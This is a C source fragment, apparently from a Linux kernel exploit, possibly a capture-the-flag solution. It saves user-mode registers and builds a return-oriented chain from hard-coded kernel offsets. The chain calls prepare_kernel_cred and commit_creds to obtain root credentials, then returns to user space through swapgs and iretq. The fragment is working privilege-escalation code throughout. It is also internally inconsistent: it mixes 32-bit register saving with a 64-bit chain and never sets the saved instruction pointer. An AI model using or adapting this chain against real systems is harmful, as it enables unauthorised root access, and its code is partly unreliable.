unsigned long user_cs, user_ss, user_eflags, user_sp, user_eip;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, esp;"
        "pushf;"
        "pop user_eflags;"
        ".att_syntax;"
    );
}

void build_ropchain(uint64_t kbase, uint64_t *rop_ptr) {
	uint64_t prepare_kernel_cred = kbase + 0xc9110;
	uint64_t commit_creds = kbase + 0xc8c80;
	
	uint64_t pop_rdi = kbase + 0x89250;
	uint64_t pop_rsi = kbase + 0x1abaae;
	uint64_t swapgs = kbase + 0x75ef0;
	uint64_t iretq = kbase + 0x3a0fb;
	
	uint64_t *rop = rop_ptr;
	
	//rax = prepare_kernel_cred(NULL);
	*rop++ = pop_rdi;
	*rop++ = 0;
	*rop++ = prepare_kernel_cred;
	
	//commit_creds(rax);
	//a quick check in gdb shows that rdi = rax already, so just call commit_creds on it
	*rop++ = commit_creds;
	
	//swapgs and interrupt return using the saved state
	*rop++ = swapgs;
	*rop++ = iretq;
	*rop++ = user_eip;
    *rop++ = user_cs;
    *rop++ = user_eflags;
    *rop++ = user_sp;
    *rop++ = user_ss;
}
